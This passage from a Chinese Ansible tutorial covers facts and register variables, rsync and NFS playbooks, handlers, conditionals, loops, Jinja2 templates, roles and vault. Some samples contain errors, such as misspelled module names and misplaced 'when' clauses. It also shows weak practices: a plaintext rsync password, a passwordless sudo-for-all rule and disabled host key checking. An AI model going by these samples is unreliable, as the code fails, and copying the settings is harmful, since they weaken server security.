 ansible_memtotal_mb <span class="hljs-comment">#内存大小(总计) 单位mb</span>
 ansible_processor_vcpus <span class="hljs-comment">#cpu数量</span>

 ansible_default_ipv4.address <span class="hljs-comment">#默认的网卡ip eth0</span>
 ansible_distribution <span class="hljs-comment">#系统发行版本名字 CentOS Ubuntu </span>

 ansible_processor_vcpus
 ansible_processor_core
11 ansible_date_time.date
</code></pre>
<ul>
<li>批量修改系统/etc/motd文件,登录的时候输出系统的基本信息.</li>
</ul>
<p>​           输出主机名</p>
<p>​           输出内存总大小</p>
<p>​		   输出ip地址</p>
<p>​           发行版本</p>
<p>​           cpu数</p>
<p>​           核心数</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment">#1. 创建包含变量的模板文件</span>
<span class="hljs-comment">#2. 发送模板文件替代/etc/motd 即可</span>
[<span class="hljs-string">root@m01</span> <span class="hljs-string">/server/scripts/playbook</span>]<span class="hljs-comment"># cat 07.change_motd.yml</span>
<span class="hljs-bullet">-</span> <span class="hljs-attr">hosts:</span> <span class="hljs-string">all</span>
  <span class="hljs-attr">tasks:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">分发motd文件</span>
      <span class="hljs-attr">templdate:</span>
        <span class="hljs-attr">src:</span> <span class="hljs-string">templates/motd.j2</span>
        <span class="hljs-attr">dest:</span> <span class="hljs-string">/etc/motd</span>
        <span class="hljs-attr">backup:</span> <span class="hljs-literal">yes</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">分发motd文件</span>
      <span class="hljs-attr">cp:</span>
        <span class="hljs-attr">src:</span> <span class="hljs-string">templates/motd.j2</span>
        <span class="hljs-attr">dest:</span> <span class="hljs-string">/tmp/motd</span>
        <span class="hljs-attr">backup:</span> <span class="hljs-literal">yes</span>
        
        


[<span class="hljs-string">root@m01</span> <span class="hljs-string">/server/scripts/playbook</span>]<span class="hljs-comment"># cat templates/motd.j2</span>
<span class="hljs-comment">#######################################</span>
<span class="hljs-string">welcome</span> <span class="hljs-string">to</span> <span class="hljs-string">oldboy</span> <span class="hljs-string">elastic</span> <span class="hljs-string">linux</span> <span class="hljs-string">system</span>
<span class="hljs-string">操作需谨慎,删根弹指间.</span>
<span class="hljs-string">主机名:</span> {{ <span class="hljs-string">ansible_hostname</span> }}
<span class="hljs-string">ip地址:</span> {{ <span class="hljs-string">ansible_default_ipv4.address</span> }}
<span class="hljs-string">内存大小:</span> {{ <span class="hljs-string">ansible_memtotal_mb</span> }}
<span class="hljs-string">CPU数量:</span> {{ <span class="hljs-string">ansible_processor_vcpus</span> }}
<span class="hljs-string">核心总数:</span> {{ <span class="hljs-string">ansible_processor_cores</span> }}
<span class="hljs-string">发行版本:</span> {{ <span class="hljs-string">ansible_distribution</span> }}
</code></pre>
<blockquote>
<p>温馨提示: template vs copy模块</p>
<p>​				copy仅仅传输数据,复制文件.</p>
<p>​				template 传输数据,复制文件的时候,文件中的变量会被解析和运行.</p>
</blockquote>
<blockquote>
<p>关于facts变量实际应用案例:</p>
<ol>
<li>
<p>通过facts变量获取系统的基本信息</p>
</li>
<li>
<p>通过facts变量获取信息并进行判断</p>
</li>
<li>
<p>如果不需要可以进行关闭,加速剧本的运行( gather_facts: no)</p>
</li>
</ol>
</blockquote>
<ul>
<li>关闭facts</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">[root@m01 ~]<span class="hljs-comment"># vim facts.yml</span>
- hosts: web_group
  gather_facts: no <span class="hljs-comment">#关闭信息采集</span>
  tasks:
</code></pre>
<h6 data-id="heading-61">05 register变量</h6>
<ul>
<li>
<p>本质上就是用来实现脚本中的<code>反引号功能. ip=\hostname -I</code></p>
</li>
<li>
<p>用户通过命令获取的内容都存放到Register变量中.</p>
</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">[root@m01 /server/scripts/playbook]<span class="hljs-comment"># cat 08.reg-vars.yml</span>
- hosts: all
  gather_facts: no
  tasks:
    - name: get <span class="hljs-built_in">date</span>
      shell: <span class="hljs-built_in">date</span> +%F
      register: result

    - name: <span class="hljs-built_in">print</span> result 变量内容
      debug:
        msg: |
              <span class="hljs-string">"register变量的全部内容是:{{ result.stderr }}"</span>
               <span class="hljs-string">"register变量的精确的内容是:{{ result.stdout}}"</span>
</code></pre>
<blockquote>
<p>register注册变量:
变量.stdout 获取输出即可</p>
<p>符号说明:
msg:中的|表示下面的内容是多行. |也可以用于其他模块中.</p>
</blockquote>
<ul>
<li>某个Register变量的信息</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">{
 <span class="hljs-string">'stderr_lines'</span>: [],
 u<span class="hljs-string">'changed'</span>: True,
 u<span class="hljs-string">'end'</span>: u<span class="hljs-string">'2022-08-24 16:38:27.887829'</span>,
 <span class="hljs-string">'failed'</span>: False,
 u<span class="hljs-string">'stdout'</span>: u<span class="hljs-string">'2022-08-24'</span>,
 u<span class="hljs-string">'cmd'</span>: u<span class="hljs-string">'date +%F'</span>,
 u<span class="hljs-string">'rc'</span>: 0,
 u<span class="hljs-string">'start'</span>: u<span class="hljs-string">'2022-08-24 16:38:27.860574'</span>,
 u<span class="hljs-string">'stderr'</span>: u<span class="hljs-string">''</span>,
 u<span class="hljs-string">'delta'</span>: u<span class="hljs-string">'0:00:00.027255'</span>,
 <span class="hljs-string">'stdout_lines'</span>: [u<span class="hljs-string">'2022-08-24'</span>],
 <span class="hljs-string">'ansible_facts'</span>: {u<span class="hljs-string">'discovered_interpreter_python'</span>:u<span class="hljs-string">'/usr/bin/python'</span>}
</code></pre>
<h5 data-id="heading-62">6.5 playbook重构rsync</h5>
<pre><code class="hljs language-sh" lang="sh">手动部署rsync服务:
1.安装rsync
2.配置rsync(配置文件提前收集)
3.创建必要数据
  创建用户
  创建密码文件 权限
  创建目录 修改权限
4.启动

[root@m01 /server/scripts/playbook]<span class="hljs-comment"># cat rsync.yml </span>
- hosts: backup
  tasks:
    - name: Install Rsync Server
      yum:
        name: rsync
        state: present
    - name: configure rsync server
      copy:
        src: rsyncd.conf
        dest: /etc/rsyncd.conf
    - name: create group www
      group:
        name: www
        gid: 666
    - name: create user www
      user:
        name: www
        uid: 666
        group: www
        shell: /sbin/nologin
        create_home: <span class="hljs-literal">false</span>
    - name: create passwd file
      copy:
        content: rsync_backup:12366
        dest: /etc/rsync.passwd
        mode: 0600
    - name: create backup <span class="hljs-built_in">dir</span>
      file:
        path: /backup
        state: directory
        owner: www
        group: www
    - name: start rsync server
      systemd:
        name: rsyncd
        state: started
        enabled: <span class="hljs-built_in">yes</span>

<span class="hljs-comment">#语法检查</span>
[root@m01 /server/scripts/playbook]<span class="hljs-comment"># ansible-playbook --syntax-check rsync.yml</span>
<span class="hljs-comment">#模拟运行</span>
[root@m01 /server/scripts/playbook]<span class="hljs-comment"># ansible-playbook -C  rsync.yml</span>
<span class="hljs-comment">#运行</span>
[root@m01 /server/scripts/playbook]<span class="hljs-comment"># ansible-playbook  rsync.yml</span>
</code></pre>
<h5 data-id="heading-63">6.5 playbook重构nfs</h5>
<pre><code class="hljs language-sh" lang="sh">手动配置nfs
1.安装nfs
  yum -y install nfs-utils
2.配置nfs
  exports(提前准备)
3.创建必要数据信息
  创建www用户
  创建共享目录/data/blog 修改属主属组
4.启动nfs

[root@m01 /server/scripts/playbook]<span class="hljs-comment"># cat nfs.yml </span>
- hosts: nfs
  tasks:
    - name: install nfs-utils server
      yum:
        name: nfs-utils
        state: present
    - name: configure nfs server
      copy:
        src: exports
        dest: /etc/exports
    - name: create group www
      group:
        name: www
        gid: 666
    - name: create user www
      user:
        name: www
        uid: 666
        group: www
        shell: /sbin/nologin
        create_home: <span class="hljs-literal">false</span>
    - name: create /code/blog <span class="hljs-built_in">dir</span>
      file:
        path: /code/blog
        state: directory
        owner: www
        group: www
    - name: start nfs server
      systemd:
        name: nfs
        state: started
        enabled: <span class="hljs-built_in">yes</span>

</code></pre>
<h4 data-id="heading-64">7.Ansible-进阶-流程控制</h4>
<h5 data-id="heading-65">7.1流程控制</h5>
<ul>
<li>handler</li>
<li>when</li>
<li>loop/with_item</li>
</ul>
<h6 data-id="heading-66">01 handler触发器</h6>
<ul>
<li>
<p>修复服务的配置文件之后，重启服务。</p>
</li>
<li>
<p>有时候配置文件没有变化的时候，则不需要重启服务，仅仅配置文件变化才需要重启服务。</p>
</li>
<li>
<p>没有使用notify和handler触发器</p>
</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">[root@m01 playbook]<span class="hljs-comment"># cat 09.ans_handler.yml </span>
- hosts: backup
  gather_facts: no
  tasks:
    - name: 分发配置文件
      copy:
        src: files/exports
        dest: /etc/exports
        backup: <span class="hljs-built_in">yes</span>
    - name: 重启服务
      systemd:
        name: nfs
        state: reloaded
</code></pre>
<blockquote>
<p>如上代码，不管分发的配置文件发生变化与否，都会重启服务</p>
</blockquote>
<ul>
<li>使用notify和handler</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">[root@m01 playbook]<span class="hljs-comment"># cat 09.ans-user-handler.yml </span>
- hosts: backup
  gather_facts: no
  tasks:
    - name: 分发配置文件
      copy:
        src: files/exports
        dest: /etc/exports
        backup: <span class="hljs-built_in">yes</span>
      notify:
        - 重启服务
 
  handlers:
    - name: 重启服务
      systemd:
        name: nfs
        state: reloaded
</code></pre>
<blockquote>
<p>只有当分发的配置文件发生变化，notify会根据 “重启服务” 去handlers查找，然后重启服务</p>
</blockquote>
<h6 data-id="heading-67">02 when判断</h6>
<ul>
<li>when进行判断，一般与变量一起使用。</li>
<li>一般facts变量或者register变量较多。</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">[root@m01 playbook]<span class="hljs-comment"># vim 10.when.yml</span>

- hosts: all
  tasks:
    - name: 只有输出信息
      debug:
        msg: <span class="hljs-string">"这是{{ansible_hostname}},正在安装软件......"</span>
      when: ansible_hostname == <span class="hljs-string">"backup"</span>
</code></pre>
<blockquote>
<p>when中使用的符号：</p>
<p>​		==  等于</p>
<p>​		is match(web)</p>
<p>​		ansible_hostname is match("web|backup")
​        ansible_hostname is not match("web|backup")</p>
</blockquote>
<ul>
<li>案例: 如果系统是centos则 安装sl,cowsay,如果是ubuntu 则安装cmatrix</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">[root@m01 /server/scripts/playbook]<span class="hljs-comment"># cat 11.when-sys.yml</span>
- hosts: all
  tasks:
    - name: yum sl,cowsay
      yum:
        name: sl,cowsay
        state: installed
        when: ansible_distribution == <span class="hljs-string">"CentOS"</span>
 
    - name: apt cmatrix
      apt:
        name: cmatrix
        state: present
        when: ansible_distribution == <span class="hljs-string">"Ubuntu"</span>
        
<span class="hljs-comment">#and</span>
 when: ( ansible_distribution == <span class="hljs-string">"CentOS"</span> and ansible_hostname == <span class="hljs-string">"web01"</span> )
 或者
  when: 
        - ansible_distribution == <span class="hljs-string">"CentOS"</span>	  <span class="hljs-comment"># 判断版本为centos</span>
        - ansible_hostname == <span class="hljs-string">"web01"</span>		  <span class="hljs-comment"># 判断主机名称为web01</span>
</code></pre>
<ul>
<li>通过nginx返回结果来判断是否让nginx重启</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">[root@ansible ansible]<span class="hljs-comment"># cat when.yml </span>
- hosts: web01
  tasks:
    - name: Configure Nginx file
      copy:
        src: nginx.conf
        dest: /etc/nginx/nginx.conf

    - name: <span class="hljs-built_in">test</span> nginx file
      shell: <span class="hljs-string">'nginx -t'</span>
      ignore_errors: <span class="hljs-built_in">yes</span>
      register: ngx_re

    - name: <span class="hljs-built_in">print</span> ngx_re    <span class="hljs-comment"># 调试完成后可以取消debug输出</span>
      debug:
        msg: <span class="hljs-string">"{{ ngx_re.stderr_lines }}"</span>

    - name: Restart Nginx Server
      systemd:
        name: nginx
        state: restarted
      when: ngx_re.stderr_lines is search <span class="hljs-string">"ok"</span>
</code></pre>
<h6 data-id="heading-68">03 循环</h6>
<ul>
<li>with_items</li>
<li>loop</li>
</ul>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#批量循环启动rpcbind和nfs服务   </span>
[root@m01 playbook]<span class="hljs-comment"># cat 12.loop.yml</span>
- hosts: backup
  gather_facts: <span class="hljs-literal">false</span>
  tasks:
    - name: 重启服务
      systemd:
        name: <span class="hljs-string">"{{ item }}"</span>
        state: restarted
      loop:
        - rpcbind
        - nfs
</code></pre>
<blockquote>
<p>loop和with_items用法一致</p>
</blockquote>
<ul>
<li>循环创建用户</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">[root@m01 playbook]<span class="hljs-comment"># vim 12.loop_user.yml </span>
- hosts: web01
  tasks:
    - name: Create www oldboy User
      user:
        name: <span class="hljs-string">"{{ item.name }}"</span>
        uid: <span class="hljs-string">"{{ item.uid }}"</span>
        group: <span class="hljs-string">"{{ item.group }}"</span>
        shell: <span class="hljs-string">"{{ item.shell }}"</span>
        create_home: <span class="hljs-string">"{{ item.home }}"</span>
        state: present
      loop:
        - { name: <span class="hljs-string">'www'</span>,uid: <span class="hljs-string">'666'</span> ,group: <span class="hljs-string">'www'</span>, shell: <span class="hljs-string">'/sbin/nologin'</span>,home: <span class="hljs-string">'false'</span> }
        - { name: <span class="hljs-string">'oldboy'</span>,uid: <span class="hljs-string">'667'</span> ,group: <span class="hljs-string">'root'</span>, shell: <span class="hljs-string">'/bin/bash'</span>,home: <span class="hljs-string">'true'</span>}

</code></pre>
<blockquote>
<p>官网资料：      <a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.ansible.com%2Fansible%2Flatest%2Fplaybook_guide%2Fplaybooks_loops.html" target="_blank" title="https://docs.ansible.com/ansible/latest/playbook_guide/playbooks_loops.html" ref="nofollow noopener noreferrer">Loops — Ansible Documentation</a></p>
</blockquote>
<ul>
<li>创建多个文件</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">创建多个文件:
file:
	path: <span class="hljs-string">"{{ item.path }}"</span>
	owner: <span class="hljs-string">"{{ item.owner }}"</span>
	group: <span class="hljs-string">"{{ item.gorup }}"</span>
	state: <span class="hljs-built_in">touch</span>
	loop:
	  - { path: 1.txt , owner: www,group: www}
	  - { path: 2.txt , owner: www,group: www}
</code></pre>
<h5 data-id="heading-69">7.2剧本调试</h5>
<ul>
<li>剧本单步执行</li>
<li>tag标签</li>
<li>忽略错误</li>
</ul>
<h6 data-id="heading-70">01 单步执行</h6>
<ul>
<li>-C 模拟运行 不做出改变</li>
<li>--syntax-check  只做语法检查，不运行</li>
<li>--step 单步运行  y执行这个task，n忽略这个task，c自动运行</li>
</ul>
<h6 data-id="heading-71">02 tag标签</h6>
<ul>
<li>类似于超市物品的分类，只不过tag标签是给ansible中的task进行分类，加上标记。</li>
<li>运行剧本的时候 运行指定的tag标签，或排除某些标签。</li>
</ul>
<pre><code class="hljs language-sh" lang="sh"> tags:
   - 标签名
运行剧本的时候
	-t 运行的标签,如果多个标签通过<span class="hljs-string">","</span>分割
	--skip-tags 排除指定的tags,如果多个标签通过<span class="hljs-string">","</span>分割
</code></pre>
<h6 data-id="heading-72">03 忽略错误</h6>
<ul>
<li>运行剧本的时候,因为重复运行导致的错误提示,并发是真的错误.</li>
<li>比如:目录已经存在,用户已经存在.</li>
<li>在这种情况下,我们可以通过ignore_errors忽略错误,让剧本可以继续运行.</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">ignore_errors: <span class="hljs-literal">true</span>
	<span class="hljs-literal">true</span>/false
	<span class="hljs-built_in">yes</span>/no
</code></pre>
<h5 data-id="heading-73">7.3   Jinja2模板</h5>
<ul>
<li>分发nginx配置文件 ,需要使用template模块中server.conf.j2 进行分发</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">[root@m01 playbook]<span class="hljs-comment"># cat 16.jinja2-for.yml </span>
- hosts: web
  gather_facts: <span class="hljs-literal">false</span>
  tasks:
    - name: 分发nginx配置文件
      template:
        src: templates/server.conf.j2
        dest: /tmp/server.conf

</code></pre>
<pre><code class="hljs language-sh" lang="sh">[root@m01 playbook]<span class="hljs-comment"># cat templates/server.conf.j2 </span>
{% <span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> [1,2,3,4,5,6] %}
  10.0.0.{{ ip }}
{%endfor%}
</code></pre>
<pre><code class="hljs language-sh" lang="sh"> ansible-playbook  16.jinja2-for.yml
</code></pre>
<ul>
<li>分发之后结果如下</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5df0db43c5d841de98e214abbc3619ed~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbGl1eDM1Mjg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768877500&amp;x-signature=uMJIXBJT%2B9LgfD2eBTu0Nf1pNsg%3D" alt="image-20230329151229975" loading="lazy"/></p>
<h5 data-id="heading-74">7.4 include文件包含</h5>
<ul>
<li>
<p>在我们书写剧本的时候，会涉及到多个步骤，还会涉及到服务端和客户端。</p>
</li>
<li>
<p>发现剧本越来越大，不容易进行分析与阅读。</p>
</li>
<li>
<p>把剧本拆分开，分成2个文件（服务端、客户端）。</p>
</li>
<li>
<p>这时候可以通过include_tasks的功能把多个剧本文件合并在一起，让剧本变成多个，方便阅读与维护。</p>
</li>
<li>
<p>案例： 通过include_tasks将部署nfs服务拆分04.deploy_nfs.yml</p>
<ul>
<li>01 deploy_nfs_server.yml</li>
<li>02 deploy_nfs_client.yml</li>
<li>03 deplay_nfs_all.yml</li>
</ul>
</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">[root@m01 playbook]<span class="hljs-comment"># cat deploy_nfs_server.yml</span>
- name: 01. 部署nfs-utils
  yum:
    name: nfs-utils,rpcbind
    state: installed
- name: 02. 修改配置文件
  <span class="hljs-comment">#copy发送过去</span>
  lineinfile:
    path: /etc/exports
    line: <span class="hljs-string">"/backup-nfs/ 172.16.1.0/24(rw,all_squash) "</span>
  notify:
    - restart nfs server
- name: 03. 共享目录
  file:
    path: /backup-nfs/
    owner: nfsnobody
    group: nfsnobody
    state: directory
- name: 04. 启动服务rpc
  systemd:
    name: rpcbind
    enabled: <span class="hljs-built_in">yes</span>
    state: started
- name: 04. 启动服务nfs
  systemd:
    name: nfs
    enabled: <span class="hljs-built_in">yes</span>
    state: started

</code></pre>
<pre><code class="hljs language-sh" lang="sh">[root@m01 playbook]<span class="hljs-comment"># cat deploy_nfs_client.yml</span>
- name: 01. 部署服务
  yum:
    name: nfs-utils,rpcbind
    state: installed

- name: 02. 挂载
  mount:
    src: 172.16.1.41:/backup-nfs/
    path: /ans-upload/
    state: mounted
    fstype: nfs

</code></pre>
<pre><code class="hljs language-sh" lang="sh">[root@m01 playbook]<span class="hljs-comment"># cat deploy_nfs_all.yml</span>
- hosts: nfs
  tasks:
    - include_tasks: deploy_nfs_server.yml
  handlers:
    - name: restart nfs server
      systemd:
        name: nfs
        state: reloaded
- hosts: web
  tasks:
    - include_tasks: deploy_nfs_client.yml

</code></pre>
<h4 data-id="heading-75">8.Ansible-角色（Roles）</h4>
<h6 data-id="heading-76">8.1 概述</h6>
<ul>
<li>是一套<strong>目录结构</strong>的要求与标准,让我们书写剧本的时候,把剧本的内容和需要的文件,按照目录要求,分门别类存储.</li>
<li>目录规范</li>
<li>模块化思想</li>
<li>尽量多使用变量</li>
<li>
<blockquote>
<p>ansible-galaxy init rsync</p>
</blockquote>
</li>
</ul>
<blockquote>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.ansible.com%2Fansible%2Flatest%2Fplaybook_guide%2Fplaybooks_reuse_roles.html" target="_blank" title="https://docs.ansible.com/ansible/latest/playbook_guide/playbooks_reuse_roles.html" ref="nofollow noopener noreferrer"> Roles — Ansible Documentation</a></p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fc24398d73e14db3a4d9fd7a0da84446~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbGl1eDM1Mjg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768877500&amp;x-signature=DVAXJZ2IMsZBMQ278o03AEMAKj4%3D" alt="image-20230329183550574" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/12cb8159140b4bf0b8747bf4078c74d4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbGl1eDM1Mjg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768877500&amp;x-signature=32rSyJJQW0iKAukSWAFRcmWzgtU%3D" alt="image-20230329183611554" loading="lazy"/></p>
<h6 data-id="heading-77">8.2 案例：roles方式部署nfs-server端</h6>
<pre><code class="hljs language-bash" lang="bash">ansible-galaxy init nfs  
<span class="hljs-comment">#创建roles标准化目录</span>
[root@m01 roles]<span class="hljs-comment"># tree -F</span>
.
├── hosts/
├── nfs-server/
│   ├── files/
│   │   └── exports
│   ├── handlers/
│   │   └── main.yml
│   ├── tasks/
│   │   └── main.yml
│   └── templates/
│       └── motd.j2
└── top.yml

6 directories, 5 files

<span class="hljs-comment">#编写主文件</span>
[root@m01 roles]<span class="hljs-comment"># vim nfs-server/tasks/main.yml </span>
- name: 01. 部署nfs-utils
  yum:
    name: nfs-utils,rpcbind
    state: installed
  tags:
    - 01-install-nfs
- name: 02. 修改配置文件
  copy:
    src: exports
    dest: /etc/exports
    backup: <span class="hljs-built_in">yes</span>
  tags:
    - 02-conf
  notify:
    - restart nfs server
- name: 03. 共享目录
  file:
    path: /backup-nfs/
    owner: nfsnobody
    group: nfsnobody
    state: directory
  tags:
    - 03-<span class="hljs-built_in">mkdir</span>
- name: 04. 启动服务rpc,nfs
  systemd:
    name: <span class="hljs-string">"{{ item }}"</span>
    enabled: <span class="hljs-built_in">yes</span>
    state: started
  loop:
    - rpcbind
    - nfs
  tags:
    - 04-start-service
- name: 05 分发motd
  template:
    src: motd.j2
    dest: /etc/motd
    backup: <span class="hljs-built_in">yes</span>
  tags:
    - 05-motd


<span class="hljs-comment">#编辑不含变量的配置文件</span>
[root@m01 roles]<span class="hljs-comment"># cat nfs-server/files/exports </span>
/backup-nfs/ 172.16.1.0/24(rw,all_squash)

<span class="hljs-comment">#编辑handler触发器部分</span>
[root@m01 roles]<span class="hljs-comment"># cat nfs-server/handlers/main.yml </span>
- name: restart nfs server
  systemd:
    name: nfs
    state: reloaded
    
<span class="hljs-comment">#使用变量模板文件，以.j2结尾</span>
[root@m01 roles]<span class="hljs-comment"># cat nfs-server/templates/motd.j2 </span>
<span class="hljs-comment">#######################################</span>
 welcome to oldboy elastic linux system
 操作需谨慎,删根弹指间.
 主机名: {{ ansible_hostname }}
 ip地址: {{ ansible_default_ipv4.address }}
 内存大小: {{ ansible_memtotal_mb }}
 CPU数量: {{ ansible_processor_vcpus }}
 核心总数: {{ ansible_processor_cores }}
 发行版本: {{ ansible_distribution }}

</code></pre>
<ul>
<li>书写剧本入口</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">[root@m01 roles]<span class="hljs-comment"># cat top.yml </span>
- hosts: backup
  roles:
    - role: nfs-server
</code></pre>
<ul>
<li>运行与调试</li>
</ul>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#注意运行时候指定hosts文件和当前要与top.yml在同一个目录.</span>
ansible-playbook -i hosts top.yml
</code></pre>
<h6 data-id="heading-78">8.3 加入变量</h6>
<ul>
<li>路径、用户、uid、gid、域名/端口</li>
</ul>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#新增变量目录与文件group_vars/all/main.yml</span>

<span class="hljs-comment">#编辑变量文件</span>
[root@m01 roles]<span class="hljs-comment"># cat group_vars/all/main.yml </span>
nfs_share_dir: /backup-nfs/
nfs_user: nfsnobody
nfs_user_id: 65534
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/51653b5bb2d744948d94999631dae741~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbGl1eDM1Mjg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768877500&amp;x-signature=5FRj9xTQuwHzA8abyCsTs2MF%2BFY%3D" alt="image-20230329210032189" loading="lazy"/></p>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#主剧本中修改变量</span>
- name: 02. 修改配置文件
  template:
    src: exports.j2
    dest: /etc/exports
    backup: <span class="hljs-built_in">yes</span>
  tags:
    - 02-conf
  notify:
    - restart nfs server
   
- name: 03. 共享目录
  file:
    path: <span class="hljs-string">"{{ nfs_share_dir }}"</span>
    owner: <span class="hljs-string">"{{ nfs_user }}"</span>
    group: <span class="hljs-string">"{{ nfs_user }}"</span>
    state: directory
  tags:
    - 03-<span class="hljs-built_in">mkdir</span>

</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d0c8d203663e45ee8dff691c9be0727c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbGl1eDM1Mjg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768877500&amp;x-signature=9tAAod1NKevcXmAp%2FQ44cC4pANA%3D" alt="image-20230329210543468" loading="lazy"/></p>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment"># 在模板目录中新增exports.j2</span>
[root@m01 roles]<span class="hljs-comment"># vim nfs-server/templates/exports.j2 </span>

{{ nfs_share_dir }} 172.16.1.0/24(rw,all_squash,anonuid={{ nfs_user_id }} ,anongid={{ nfs_user_id }})
</code></pre>
<h4 data-id="heading-79">9.Ansible-Vault</h4>
<ul>
<li>ansible-vault用于加密敏感信息</li>
<li>hosts文件 加密</li>
<li>变量文件 加密</li>
</ul>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#进行加密</span>
ansible-vault encrypt 文件
<span class="hljs-comment">#进行使用</span>
ansible或ansible-playbook --ask-vault-pass 即可
<span class="hljs-comment">#彻底解密</span>
ansible-vault decrypt hosts
</code></pre>
<h4 data-id="heading-80">10.Ansible-Galaxy</h4>
<ul>
<li>别人的roles</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">ansible-galaxy collection install nginxinc.nginx_core
</code></pre>
<h4 data-id="heading-81">11.Ansible-优化</h4>
<ul>
<li>
<p>性能</p>
<ul>
<li>ssh连接速度优化,关闭UseDNS,GSSAPIAuthcation ....</li>
<li>不要让ansible运行交互式的命令,非要用使用命令的非交互模式.</li>
<li>yum安装本地安装.(自建yum源,自己制作的rpm包)</li>
<li>调整ansible并发数量( -f 调整并发数量 默认是5 ansible.cfg  forks=5,实际调整根据负载情况.)</li>
<li>给ansible配置缓存,队列</li>
<li>给主机进行分组操作</li>
<li>关闭gather_facts,如果不用facts变量可以关闭, 剧本中:gather_facts: false 配置文件:gathering = explicit</li>
<li>关闭host,key,check 一般使用密码认证的时候需要关闭,如果不关闭\ansible配置文件 host_key_checking = False</li>
</ul>
</li>
<li>
<p>安全</p>
<ul>
<li>配置sudo用户 ans ALL=(ALL) NOPASSWD: ALL 密码是1,ssh端口是 22</li>
<li>配合vpn,jms一起使用</li>
<li>用户 -- &gt;vpn----&gt;jms(跳板机)----&gt;ansible用户的密码,进行加密( hash, ansible-vault)</li>
</ul>
</li>
<li>
<p>配置sudo</p>
</li>
</ul>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#管理端</span>
[root@m01 /server/scripts/playbook]<span class="hljs-comment"># egrep -v '^$|#' /etc/ansible/ansible.cfg</span>
[defaults]
sudo_user = ans  <span class="hljs-comment">#被管理端上具有sudo权限的用户 nopasswd:ALL</span>
remote_user = ans    <span class="hljs-comment">#被管理端使用的用户,不指定默认是当前用户/root</span>
remote_port = 22      <span class="hljs-comment">#被管理端ssh端口号</span>
host_key_checking = False
log_path = /var/log/ansible.log
[inventory]
[privilege_escalation]
become=True  <span class="hljs-comment">##开启sudo功能</span>
become_method=sudo <span class="hljs-comment">#使用sudo命令</span>
become_user=root <span class="hljs-comment">#普通用户切换为root</span>
[paramiko_connection]
[ssh_connection]
[persistent_connection]
[accelerate]
[selinux]
[colors]
[diff]


<span class="hljs-comment">#被管理端</span>
vim /etc/sudoers

ans ALL=(ALL) NOPASSWD: ALL <span class="hljs-comment">#密码是1,ssh端口是 22</span>

<span class="hljs-comment">#禁用root登录</span>
vim /etc/ssh/sshd_config 
PermitRootLogin no
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[websocket的理解，写一个在线聊天室]]></title>    <link>https://juejin.cn/post/7594627998839062570</link>    <guid>https://juejin.cn/post/7594627998839062570</guid>    <pubDate>2026-01-13T03:03:10.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594627998839062570" data-draft-id="7592887786967744548" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="websocket的理解，写一个在线聊天室"/> <meta itemprop="keywords" content="WebSocket"/> <meta itemprop="datePublished" content="2026-01-13T03:03:10.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="李承影"/> <meta itemprop="url" 